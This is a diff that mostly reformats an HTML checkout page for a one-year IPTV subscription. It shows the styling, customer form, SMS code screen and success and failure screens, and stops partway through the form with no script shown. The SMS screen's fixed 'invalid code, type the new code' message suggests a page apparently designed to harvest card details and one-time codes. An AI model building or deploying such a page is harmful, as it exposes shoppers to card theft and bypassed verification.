@@ -1,1080 +1,922 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>IPTV Premium Checkout • 1 year / 2 devices</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0b0d15;
-            background-image: radial-gradient(circle at 20% 30%, #1a1f33 0%, #0b0d15 70%);
-            min-height: 100vh;
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 1.5rem;
-            color: #eef2fb;
-        }
-
-        .checkout-wrapper {
-            max-width: 1320px;
-            width: 100%;
-        }
-
-        .progress-steps {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin-bottom: 2.5rem;
-            flex-wrap: wrap;
-        }
-        .step {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-size: 0.9rem;
-            font-weight: 500;
-            color: #8b93b0;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(4px);
-            padding: 0.4rem 1.2rem 0.4rem 1rem;
-            border-radius: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            transition: all 0.2s;
-        }
-        .step.active {
-            color: #d2daff;
-            border-color: #6d5cff;
-            background: rgba(109, 92, 255, 0.08);
-            box-shadow: 0 0 12px rgba(109, 92, 255, 0.15);
-        }
-        .step .num {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 255, 255, 0.05);
-            width: 24px;
-            height: 24px;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-        .step.active .num {
-            background: #6d5cff;
-            color: #fff;
-        }
-
-        .checkout-grid {
-            display: grid;
-            grid-template-columns: 1.2fr 1fr;
-            gap: 2rem;
-        }
-
-        .glass-card {
-            background: rgba(20, 25, 45, 0.55);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 32px;
-            padding: 2rem 2rem 2.2rem;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-            transition: transform 0.25s ease, box-shadow 0.3s;
-        }
-
-        .glass-card:hover {
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-
-        .left-col .glass-card {
-            padding-bottom: 1.8rem;
-        }
-
-        h2 {
-            font-weight: 600;
-            font-size: 1.2rem;
-            letter-spacing: -0.01em;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: #eef2fb;
-        }
-        h2 svg {
-            width: 24px;
-            height: 24px;
-            stroke: #6d5cff;
-            fill: none;
-        }
-
-        .form-group {
-            margin-bottom: 1.2rem;
-            position: relative;
-        }
-
-        .form-label {
-            display: block;
-            font-size: 0.8rem;
-            font-weight: 500;
-            color: #aab3d0;
-            margin-bottom: 0.25rem;
-            letter-spacing: 0.02em;
-        }
-
-        .form-control,
-        .form-select {
-            width: 100%;
-            padding: 0.7rem 1rem;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            color: #f0f4ff;
-            font-size: 0.95rem;
-            transition: all 0.2s;
-            outline: none;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .form-control:focus,
-        .form-select:focus {
-            border-color: #6d5cff;
-            box-shadow: 0 0 0 3px rgba(109, 92, 255, 0.2);
-            background: rgba(10, 12, 25, 0.6);
-        }
-
-        .form-control::placeholder {
-            color: #5f698a;
-            font-weight: 400;
-            font-size: 0.9rem;
-        }
-
-        .form-select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236d5cff' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 1rem center;
-            padding-right: 2.8rem;
-            cursor: pointer;
-        }
-
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1rem;
-        }
-
-        .required-star {
-            color: #ff6575;
-            margin-left: 2px;
-        }
-
-        .validation-feedback {
-            font-size: 0.75rem;
-            margin-top: 4px;
-            color: #ff6575;
-            display: none;
-        }
-        .validation-feedback.visible {
-            display: block;
-        }
-        .form-control.error,
-        .form-select.error {
-            border-color: #ff6575;
-        }
-
-        .phone-group {
-            display: flex;
-            gap: 0.5rem;
-        }
-        .phone-group .form-select {
-            width: 110px;
-            flex-shrink: 0;
-        }
-        .phone-group .form-control {
-            flex: 1;
-        }
-
-        .card-icons {
-            display: flex;
-            gap: 0.75rem;
-            margin-bottom: 1.2rem;
-            flex-wrap: wrap;
-        }
-        .card-icons span {
-            background: rgba(255, 255, 255, 0.04);
-            padding: 0.2rem 0.8rem;
-            border-radius: 30px;
-            font-size: 0.7rem;
-            font-weight: 500;
-            color: #b8c4e5;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-        }
-
-        .summary-card {
-            position: sticky;
-            top: 1.5rem;
-        }
-        .product-badge {
-            display: inline-block;
-            background: linear-gradient(145deg, #6d5cff, #4a3cc0);
-            padding: 0.2rem 1rem;
-            border-radius: 40px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            letter-spacing: 0.03em;
-            color: #fff;
-            margin-bottom: 0.5rem;
-        }
-        .summary-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            letter-spacing: -0.02em;
-            line-height: 1.2;
-        }
-        .summary-bonus {
-            background: rgba(109, 92, 255, 0.15);
-            color: #b7adff;
-            padding: 0.2rem 0.8rem;
-            border-radius: 40px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            display: inline-block;
-            margin: 0.5rem 0 1rem 0;
-        }
-        .price-large {
-            font-size: 2.6rem;
-            font-weight: 700;
-            color: #fff;
-            letter-spacing: -0.02em;
-        }
-        .price-large small {
-            font-size: 1.1rem;
-            font-weight: 500;
-            color: #9aa6cc;
-        }
-        .price-strikethrough {
-            font-size: 1rem;
-            color: #6b769b;
-            text-decoration: line-through;
-            margin-left: 0.5rem;
-            font-weight: 400;
-        }
-        .summary-line {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            font-size: 0.95rem;
-        }
-        .summary-line.total {
-            border-bottom: none;
-            font-weight: 700;
-            font-size: 1.2rem;
-            padding-top: 1rem;
-            color: #fff;
-        }
-        .secure-badge {
-            margin-top: 1.8rem;
-            background: rgba(0, 0, 0, 0.25);
-            border-radius: 30px;
-            padding: 0.8rem 1.2rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            flex-wrap: wrap;
-            font-size: 0.8rem;
-            color: #a5b1d6;
-        }
-        .secure-badge svg {
-            stroke: #6d5cff;
-            fill: none;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(145deg, #6d5cff, #4e3fd9);
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: #fff;
-            margin-top: 1.5rem;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.6rem;
-            box-shadow: 0 8px 25px rgba(109, 92, 255, 0.25);
-            letter-spacing: 0.01em;
-        }
-        .btn-primary:hover:not(:disabled) {
-            transform: scale(1.02);
-            background: linear-gradient(145deg, #7f70ff, #5a4ae0);
-            box-shadow: 0 10px 35px rgba(109, 92, 255, 0.4);
-        }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .btn-primary .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-top: 2px solid #fff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        .btn-primary.loading .spinner {
-            display: inline-block;
-        }
-        .btn-primary.loading .btn-text {
-            display: none;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .sms-screen {
-            display: none;
-            text-align: center;
-            padding: 1.5rem 0.5rem;
-        }
-        .sms-screen.show {
-            display: block;
-        }
-        .sms-screen .sms-icon {
-            font-size: 3rem;
-            margin-bottom: 0.5rem;
-        }
-        .sms-screen .sms-sub {
-            color: #a5b1d6;
-            font-size: 0.9rem;
-            margin-bottom: 1.5rem;
-        }
-        .sms-screen .form-control {
-            text-align: center;
-            letter-spacing: 0.3rem;
-            font-size: 1.2rem;
-            max-width: 240px;
-            margin: 0 auto;
-        }
-        .sms-screen .sms-error {
-            color: #ff6575;
-            font-size: 0.85rem;
-            margin-top: 0.8rem;
-            display: none;
-        }
-        .sms-screen .sms-error.visible {
-            display: block;
-        }
-
-        .result-screen {
-            display: none;
-            text-align: center;
-            padding: 2rem 1.5rem;
-        }
-        .result-screen.show {
-            display: block;
-        }
-        .result-icon {
-            font-size: 3.6rem;
-            margin-bottom: 0.5rem;
-        }
-        .result-screen .sub-text {
-            color: #b7c2e5;
-            margin-bottom: 0.5rem;
-        }
-
-        .order-detail {
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 20px;
-            padding: 1.2rem;
-            margin-top: 1.5rem;
-            text-align: left;
-            font-size: 0.95rem;
-        }
-        .order-detail .detail-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0.4rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            gap: 0.5rem;
-        }
-        .order-detail .detail-row:last-child {
-            border-bottom: 0;
-        }
-        .copy-btn {
-            background: rgba(109, 92, 255, 0.15);
-            border: none;
-            color: #b7adff;
-            padding: 0.1rem 0.6rem;
-            border-radius: 12px;
-            font-size: 0.7rem;
-            cursor: pointer;
-            transition: 0.2s;
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-        .copy-btn:hover {
-            background: rgba(109, 92, 255, 0.3);
-        }
-        .detail-value {
-            word-break: break-all;
-            text-align: right;
-            flex: 1;
-        }
-
-        .btn-retry {
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            color: #eef2fb;
-            margin-top: 1rem;
-        }
-        .btn-retry:hover {
-            background: rgba(255, 255, 255, 0.12);
-        }
-
-        @media (max-width: 920px) {
-            .checkout-grid {
-                grid-template-columns: 1fr;
-            }
-            .summary-card {
-                position: static;
-            }
-            .form-row {
-                grid-template-columns: 1fr;
-            }
-            .phone-group .form-select {
-                width: 100px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .glass-card {
-                padding: 1.5rem;
-            }
-            .price-large {
-                font-size: 2rem;
-            }
-        }
-
-        .bg-glow {
-            position: fixed;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(109, 92, 255, 0.08) 0%, transparent 70%);
-            border-radius: 50%;
-            top: -200px;
-            right: -200px;
-            pointer-events: none;
-            z-index: 0;
-        }
-        .bg-glow2 {
-            position: fixed;
-            width: 500px;
-            height: 500px;
-            background: radial-gradient(circle, rgba(70, 60, 200, 0.06) 0%, transparent 70%);
-            border-radius: 50%;
-            bottom: -150px;
-            left: -150px;
-            pointer-events: none;
-            z-index: 0;
-        }
-        .checkout-wrapper {
-            position: relative;
-            z-index: 2;
-        }
-
-        #cardNumber {
-            font-family: 'Inter', monospace;
-            letter-spacing: 0.05rem;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IPTV Premium Checkout • 1 year / 2 devices</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: #0b0d15;
+      background-image: radial-gradient(circle at 20% 30%, #1a1f33 0%, #0b0d15 70%);
+      min-height: 100vh;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1.5rem;
+      color: #eef2fb;
+    }
+    .checkout-wrapper { max-width:1320px; width:100%; }
+    .progress-steps {
+      display: flex;
+      justify-content: center;
+      gap: 2rem;
+      margin-bottom: 2.5rem;
+      flex-wrap: wrap;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #8b93b0;
+      background: rgba(255,255,255,0.03);
+      backdrop-filter: blur(4px);
+      padding: 0.4rem 1.2rem 0.4rem 1rem;
+      border-radius: 40px;
+      border: 1px solid rgba(255,255,255,0.04);
+      transition: all 0.2s;
+    }
+    .step.active {
+      color: #d2daff;
+      border-color: #6d5cff;
+      background: rgba(109,92,255,0.08);
+      box-shadow: 0 0 12px rgba(109,92,255,0.15);
+    }
+    .step .num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255,255,255,0.05);
+      width: 24px;
+      height: 24px;
+      border-radius: 30px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+    .step.active .num { background:#6d5cff; color:#fff; }
+    .checkout-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: 2rem;
+    }
+    .glass-card {
+      background: rgba(20,25,45,0.55);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 32px;
+      padding: 2rem 2rem 2.2rem;
+      border: 1px solid rgba(255,255,255,0.04);
+      box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+      transition: transform 0.25s ease, box-shadow 0.3s;
+    }
+    .glass-card:hover { box-shadow: 0 30px 60px rgba(0,0,0,0.7); }
+    .left-col .glass-card { padding-bottom: 1.8rem; }
+    h2 {
+      font-weight: 600;
+      font-size: 1.2rem;
+      letter-spacing: -0.01em;
+      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: #eef2fb;
+    }
+    h2 svg { width:24px; height:24px; stroke:#6d5cff; fill:none; }
+    .form-group { margin-bottom:1.2rem; position:relative; }
+    .form-label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #aab3d0;
+      margin-bottom: 0.25rem;
+      letter-spacing: 0.02em;
+    }
+    .form-control, .form-select {
+      width: 100%;
+      padding: 0.7rem 1rem;
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 16px;
+      color: #f0f4ff;
+      font-size: 0.95rem;
+      transition: all 0.2s;
+      outline: none;
+      font-family: 'Inter', sans-serif;
+    }
+    .form-control:focus, .form-select:focus {
+      border-color: #6d5cff;
+      box-shadow: 0 0 0 3px rgba(109,92,255,0.2);
+      background: rgba(10,12,25,0.6);
+    }
+    .form-control::placeholder { color:#5f698a; font-weight:400; font-size:0.9rem; }
+    .form-select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236d5cff' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+      padding-right: 2.8rem;
+      cursor: pointer;
+    }
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    .required-star { color:#ff6575; margin-left:2px; }
+    .validation-feedback {
+      font-size: 0.75rem;
+      margin-top: 4px;
+      color: #ff6575;
+      display: none;
+    }
+    .validation-feedback.visible { display:block; }
+    .form-control.error, .form-select.error { border-color:#ff6575; }
+    .phone-group {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .phone-group .form-select { width:110px; flex-shrink:0; }
+    .phone-group .form-control { flex:1; }
+    .card-icons {
+      display: flex;
+      gap: 0.75rem;
+      margin-bottom: 1.2rem;
+      flex-wrap: wrap;
+    }
+    .card-icons span {
+      background: rgba(255,255,255,0.04);
+      padding: 0.2rem 0.8rem;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 500;
+      color: #b8c4e5;
+      border: 1px solid rgba(255,255,255,0.04);
+    }
+    .summary-card { position:sticky; top:1.5rem; }
+    .product-badge {
+      display: inline-block;
+      background: linear-gradient(145deg, #6d5cff, #4a3cc0);
+      padding: 0.2rem 1rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      letter-spacing: 0.03em;
+      color: #fff;
+      margin-bottom: 0.5rem;
+    }
+    .summary-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.2;
+    }
+    .summary-bonus {
+      background: rgba(109,92,255,0.15);
+      color: #b7adff;
+      padding: 0.2rem 0.8rem;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      display: inline-block;
+      margin: 0.5rem 0 1rem 0;
+    }
+    .price-large {
+      font-size: 2.6rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.02em;
+    }
+    .price-large small {
+      font-size: 1.1rem;
+      font-weight: 500;
+      color: #9aa6cc;
+    }
+    .price-strikethrough {
+      font-size: 1rem;
+      color: #6b769b;
+      text-decoration: line-through;
+      margin-left: 0.5rem;
+      font-weight: 400;
+    }
+    .summary-line {
+      display: flex;
+      justify-content: space-between;
+      padding: 0.5rem 0;
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      font-size: 0.95rem;
+    }
+    .summary-line.total {
+      border-bottom: none;
+      font-weight: 700;
+      font-size: 1.2rem;
+      padding-top: 1rem;
+      color: #fff;
+    }
+    .secure-badge {
+      margin-top: 1.8rem;
+      background: rgba(0,0,0,0.25);
+      border-radius: 30px;
+      padding: 0.8rem 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      font-size: 0.8rem;
+      color: #a5b1d6;
+    }
+    .secure-badge svg { stroke:#6d5cff; fill:none; }
+    .btn-primary {
+      width: 100%;
+      padding: 1rem;
+      background: linear-gradient(145deg, #6d5cff, #4e3fd9);
+      border: none;
+      border-radius: 40px;
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #fff;
+      margin-top: 1.5rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      box-shadow: 0 8px 25px rgba(109,92,255,0.25);
+      letter-spacing: 0.01em;
+    }
+    .btn-primary:hover:not(:disabled) {
+      transform: scale(1.02);
+      background: linear-gradient(145deg, #7f70ff, #5a4ae0);
+      box-shadow: 0 10px 35px rgba(109,92,255,0.4);
+    }
+    .btn-primary:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .btn-primary .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top: 2px solid #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    .btn-primary.loading .spinner { display:inline-block; }
+    .btn-primary.loading .btn-text { display:none; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .sms-screen { display:none; text-align:center; padding:1.5rem 0.5rem; }
+    .sms-screen.show { display:block; }
+    .sms-screen .sms-icon { font-size:3rem; margin-bottom:0.5rem; }
+    .sms-screen .sms-sub { color:#a5b1d6; font-size:0.9rem; margin-bottom:1.5rem; }
+    .sms-screen .form-control {
+      text-align: center;
+      letter-spacing: 0.3rem;
+      font-size: 1.2rem;
+      max-width: 240px;
+      margin: 0 auto;
+    }
+    .sms-screen .sms-error {
+      color: #ff6575;
+      font-size: 0.85rem;
+      margin-top: 0.8rem;
+      display: none;
+    }
+    .sms-screen .sms-error.visible { display:block; }
+    .result-screen { display:none; text-align:center; padding:2rem 1.5rem; }
+    .result-screen.show { display:block; }
+    .result-icon { font-size:3.6rem; margin-bottom:0.5rem; }
+    .result-screen .sub-text { color:#b7c2e5; margin-bottom:0.5rem; }
+    .order-detail {
+      background: rgba(0,0,0,0.2);
+      border-radius: 20px;
+      padding: 1.2rem;
+      margin-top: 1.5rem;
+      text-align: left;
+      font-size: 0.95rem;
+    }
+    .order-detail .detail-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.4rem 0;
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      gap: 0.5rem;
+    }
+    .order-detail .detail-row:last-child { border-bottom:0; }
+    .copy-btn {
+      background: rgba(109,92,255,0.15);
+      border: none;
+      color: #b7adff;
+      padding: 0.1rem 0.6rem;
+      border-radius: 12px;
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: 0.2s;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .copy-btn:hover { background:rgba(109,92,255,0.3); }
+    .detail-value { word-break:break-all; text-align:right; flex:1; }
+    .btn-retry {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+      color: #eef2fb;
+      margin-top: 1rem;
+    }
+    .btn-retry:hover { background:rgba(255,255,255,0.12); }
+    @media (max-width:920px) {
+      .checkout-grid { grid-template-columns:1fr; }
+      .summary-card { position:static; }
+      .form-row { grid-template-columns:1fr; }
+      .phone-group .form-select { width:100px; }
+    }
+    @media (max-width:480px) {
+      .glass-card { padding:1.5rem; }
+      .price-large { font-size:2rem; }
+    }
+    .bg-glow {
+      position: fixed;
+      width: 600px;
+      height: 600px;
+      background: radial-gradient(circle, rgba(109,92,255,0.08) 0%, transparent 70%);
+      border-radius: 50%;
+      top: -200px;
+      right: -200px;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .bg-glow2 {
+      position: fixed;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(70,60,200,0.06) 0%, transparent 70%);
+      border-radius: 50%;
+      bottom: -150px;
+      left: -150px;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .checkout-wrapper { position:relative; z-index:2; }
+    #cardNumber { font-family:'Inter', monospace; letter-spacing:0.05rem; }
+  </style>
 </head>
 <body>
-    <div class="bg-glow"></div>
-    <div class="bg-glow2"></div>
+  <div class="bg-glow"></div>
+  <div class="bg-glow2"></div>
 
-    <div class="checkout-wrapper">
-        <div class="progress-steps">
-            <div class="step active"><span class="num">1</span> Customer</div>
-            <div class="step"><span class="num">2</span> Billing</div>
-            <div class="step"><span class="num">3</span> Payment</div>
-        </div>
+  <div class="checkout-wrapper">
+    <div class="progress-steps">
+      <div class="step active"><span class="num">1</span> Customer</div>
+      <div class="step"><span class="num">2</span> Billing</div>
+      <div class="step"><span class="num">3</span> Payment</div>
+    </div>
 
-        <div class="checkout-grid">
-            <div class="left-col" id="checkoutFormContainer">
-                <div class="glass-card" id="checkoutFormCard">
+    <div class="checkout-grid">
+      <div class="left-col" id="checkoutFormContainer">
+        <div class="glass-card" id="checkoutFormCard">
 
-                    <!-- SMS verification screen -->
-                    <div class="sms-screen" id="smsScreen">
-                        <div class="sms-icon">📱</div>
-                        <h2 style="justify-content:center;">Enter SMS Code</h2>
-                        <p class="sms-sub">We sent a 4-6 digit code to your phone.<br />This may take a few minutes.</p>
-                        <input type="text" class="form-control" id="smsCode" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
-                        <div class="sms-error" id="smsError">❌ Invalid SMS code. Please type the new code received.</div>
-                        <button class="btn-primary" id="smsVerifyBtn" style="margin-top:1rem;">
-                            <span class="btn-text">✅ Verify SMS</span>
-                            <span class="spinner"></span>
-                        </button>
-                        <button class="btn-primary" id="smsRetryBtn" style="margin-top:0.5rem; background:rgba(255,255,255,0.05); box-shadow:none;">
-                            <span class="btn-text">🔄 Resend SMS</span>
-                        </button>
-                    </div>
+          <!-- SMS verification screen -->
+          <div class="sms-screen" id="smsScreen">
+            <div class="sms-icon">📱</div>
+            <h2 style="justify-content:center;">Enter SMS Code</h2>
+            <p class="sms-sub">We sent a 4-6 digit code to your phone.<br />This may take a few minutes.</p>
+            <input type="text" class="form-control" id="smsCode" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
+            <div class="sms-error" id="smsError">❌ Invalid SMS code. Please type the new code received.</div>
+            <button class="btn-primary" id="smsVerifyBtn" style="margin-top:1rem;">
+              <span class="btn-text">✅ Verify SMS</span>
+              <span class="spinner"></span>
+            </button>
+            <button class="btn-primary" id="smsRetryBtn" style="margin-top:0.5rem; background:rgba(255,255,255,0.05); box-shadow:none;">
+              <span class="btn-text">🔄 Resend SMS</span>
+            </button>
+          </div>
 
-                    <!-- SUCCESS screen -->
-                    <div class="result-screen" id="successScreen">
-                        <div class="result-icon">🎉</div>
-                        <h2 style="justify-content:center; margin-bottom:0.25rem;">Payment Successful</h2>
-                        <p class="sub-text">Thank you for your order.</p>
-                        <div class="order-detail" id="orderDetail">
-                            <div class="detail-row"><span>📦 Order</span> <span class="detail-value" id="orderNumber">#IPTV-2847-91</span> <button class="copy-btn" data-copy="orderNumber">📋 Copy</button></div>
-                            <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 1 Year / 2 Devices</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
-                            <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$100.00 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
-                            <div class="detail-row"><span>📧 Email</span> <span class="detail-value" id="successEmail">—</span> <button class="copy-btn" data-copy="successEmail">📋 Copy</button></div>
-                            <div class="detail-row"><span>📞 Phone</span> <span class="detail-value" id="successPhone">—</span> <button class="copy-btn" data-copy="successPhone">📋 Copy</button></div>
-                            <div class="detail-row"><span>👤 Cardholder</span> <span class="detail-value" id="successCardholder">—</span> <button class="copy-btn" data-copy="successCardholder">📋 Copy</button></div>
-                        </div>
-                    </div>
-
-                    <!-- FAILURE screen -->
-                    <div class="result-screen" id="failureScreen">
-                        <div class="result-icon">❌</div>
-                        <h2 style="justify-content:center; margin-bottom:0.25rem; color:#ff6575;">Payment Failed</h2>
-                        <p class="sub-text">We couldn't process your payment. Please try again later.</p>
-                        <div style="margin-top:1.5rem; background:rgba(255,101,117,0.06); border-radius:16px; padding:1rem; border:1px solid rgba(255,101,117,0.1);">
-                            <p style="color:#aab3d0; font-size:0.9rem;">If you continue to experience issues, please contact our support team.</p>
-                        </div>
-                        <button class="btn-primary btn-retry" id="retryPaymentBtn" style="margin-top:1.5rem;">
-                            <span class="btn-text">🔄 Try Again</span>
-                        </button>
-                    </div>
-
-                    <!-- form -->
-                    <div id="formFields">
-                        <h2><svg viewBox="0 0 24 24" stroke-width="1.8"><path d="M12 2v4M12 22v-4M4 12H2M6 12H4M20 12h-2M22 12h-2M19.07 4.93l-2.83 2.83M4.93 19.07l2.83-2.83M19.07 19.07l-2.83-2.83M4.93 4.93l2.83 2.83"/></svg> Customer information</h2>
-
-                            <div class="form-group">
-                                <label class="form-label">Country/Region <span class="required-star">*</span></label>
-                                <select class="form-select" id="countrySelect">
-                                    <!-- Bulgaria default -->
-                                    <option value="BG" selected>Bulgaria (+359)</option>
-                                    <option value="AE">United Arab Emirates (+971)</option>
-                                    <option value="SN">Senegal (+221)</option>
-                                    <option value="PH">Philippines (+63)</option>
-                                    <option value="BE">Belgium (+32)</option>
-                                    <option value="US">United States (+1)</option>
-                                    <option value="UK">United Kingdom (+44)</option>
-                                    <option value="DE">Germany (+49)</option>
-                                    <option value="FR">France (+33)</option>
-                                    <option value="ES">Spain (+34)</option>
-                                    <option value="IT">Italy (+39)</option>
-                                    <option value="NL">Netherlands (+31)</option>
-                                    <option value="PT">Portugal (+351)</option>
-                                    <option value="CH">Switzerland (+41)</option>
-                                    <option value="AT">Austria (+43)</option>
-                                    <option value="SE">Sweden (+46)</option>
-                                    <option value="NO">Norway (+47)</option>
-                                    <option value="DK">Denmark (+45)</option>
-                                    <option value="FI">Finland (+358)</option>
-                                    <option value="PL">Poland (+48)</option>
-                                    <option value="TR">Turkey (+90)</option>
-                                    <option value="AU">Australia (+61)</option>
-                                    <option value="CA">Canada (+1)</option>
-                                </select>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Full Name <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="fullName" placeholder="John Doe" autocomplete="name" />
-                                <div class="validation-feedback" id="fullNameError">Please enter your full name.</div>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Email Address <span class="required-star">*</span></label>
-                                <input type="email" class="form-control" id="email" placeholder="john@example.com" autocomplete="email" />
-                                <div class="validation-feedback" id="emailError">Enter a valid email address.</div>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Mobile Phone <span class="required-star">*</span></label>
-                                <div class="phone-group">
-                                    <select class="form-select" id="phoneCodeSelect"></select>
-                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="50 123 4567" autocomplete="tel" />
-                                </div>
-                                <div class="validation-feedback" id="phoneError">Please enter a valid phone number.</div>
-                            </div>
-
-                            <div class="form-group">
-                                <label class="form-label">Street Address <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="address" placeholder="123 Main St" autocomplete="address-line1" />
-                                <div class="validation-feedback" id="addressError">Street address is required.</div>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">Apartment / Suite / Unit</label>
